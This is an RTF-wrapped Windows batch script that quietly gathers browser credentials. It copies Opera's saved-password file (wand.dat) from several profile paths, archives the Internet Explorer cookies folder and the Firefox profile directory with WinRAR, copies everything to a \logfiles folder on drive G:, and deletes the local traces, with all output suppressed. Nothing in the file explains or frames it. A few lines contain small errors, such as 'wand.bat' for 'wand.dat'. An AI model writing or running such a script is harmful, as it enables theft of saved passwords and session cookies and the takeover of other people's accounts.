{\rtf1\ansi\ansicpg1251\cocoartf1561\cocoasubrtf400
{\fonttbl\f0\fmodern\fcharset0 Courier;\f1\fmodern\fcharset0 Courier-Bold;}
{\colortbl;\red255\green255\blue255;\red87\green197\blue83;\red254\green254\blue254;\red109\green109\blue109;
\red11\green102\blue255;\red201\green201\blue201;\red107\green0\blue109;\red251\green0\blue16;\red190\green74\blue193;
\red251\green0\blue7;}
{\*\expandedcolortbl;;\cssrgb\c40000\c80000\c40000;\cssrgb\c99608\c99608\c99608;\cssrgb\c50196\c50196\c50196;
\cssrgb\c0\c50196\c100000;\cssrgb\c82745\c82745\c82745;\cssrgb\c50196\c0\c50196;\cssrgb\c100000\c6275\c6275;\cssrgb\c80000\c40000\c80000;
\cssrgb\c100000\c0\c0;}
{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc0\levelnfcn0\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{decimal\}}{\leveltext\leveltemplateid1\'01\'00;}{\levelnumbers\'01;}\fi-360\li720\lin720 }{\listname ;}\listid1}}
{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
\ls1\ilvl0
\f0\fs26\fsmilli13333 \cf2 \cb3 \expnd0\expndtw0\kerning0
@\cf4 Echo 
\f1\b \cf5 off
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf2 \cb3 @\cf7 if\cf4  not exist \\logfiles md \\logfiles \cf2 >\cf4 nul\cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 c
\f1\b \cf8 :
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 chdir \cf2 %\cf4 APPDATA\cf2 %\cf4 \\Opera\\Opera\\profile\\ \cf2 >\cf4 nul\cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 copy wand.dat g
\f1\b \cf8 :\\logfiles\\wand.dat >nul\cf6 \cb1 \
\ls1\ilvl0
\f0\b0 \cf4 \cb3 c
\f1\b \cf8 :
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 chdir \cf2 %\cf4 APPDATA\cf2 %\cf4 \\Opera\\Opera \cf9 10\cf4  Preview\cf2 !\cf4 \\profile\\ \cf2 >\cf4 nul\cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 copy wand.dat g
\f1\b \cf8 :\\logfiles\\ >nul
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 c
\f1\b \cf8 :
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 chdir \cf2 %\cf4 ProgramFiles\cf2 %\cf4 \\Opera AC \cf9 3.7\cf4 \\profile
\f1\b \cf6 \cb1 \
\ls1\ilvl0
\f0\b0 \cf4 \cb3 copy wand.bat g
\f1\b \cf8 :\\logfiles\\ >nul
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 c
\f1\b \cf8 :
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 chdir \cf2 %\cf4 UserProfile\cf2 %\cf4 \\Cookies\\\cf6 \cb1 \
\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
\ls1\ilvl0\cf10 \cb3 "C:\\Program Files\\WinRAR\\WinRAR.exe"\cf4  u \cf2 -\cf4 r \cf2 -\cf4 y \cf2 -\cf4 ep1 Cookies.rar \cf2 *\cf4 .\cf2 *\cf6 \cb1 \
\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
\ls1\ilvl0\cf4 \cb3 copy Cookies.rar g
\f1\b \cf8 :\\logfiles\\ >nul\cf6 \cb1 \
\ls1\ilvl0
\f0\b0 \cf4 \cb3 del Cookies.rar \cf2 >\cf4 nul\cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 c
\f1\b \cf8 :
\f0\b0 \cf6 \cb1 \
\ls1\ilvl0\cf4 \cb3 chdir \cf2 %\cf4 APPDATA\cf2 %\cf4 \\Mozilla\\Firefox\\ \cf2 >\cf4 nul\cf6 \cb1 \
\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
\ls1\ilvl0\cf10 \cb3 "C:\\Program Files\\WinRAR\\WinRAR.exe"\cf4  u \cf2 -\cf4 r \cf2 -\cf4 y \cf2 -\cf4 ep1 Profiles.rar \cf2 *\cf4 .\cf2 *\cf6 \cb1 \
\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
\ls1\ilvl0\cf4 \cb3 copy Profiles.rar g
\f1\b \cf8 :\\logfiles\\ >nul\cf6 \cb1 \
\ls1\ilvl0
\f0\b0 \cf4 \cb3 del profiles.rar \cf2 >\cf4 nul}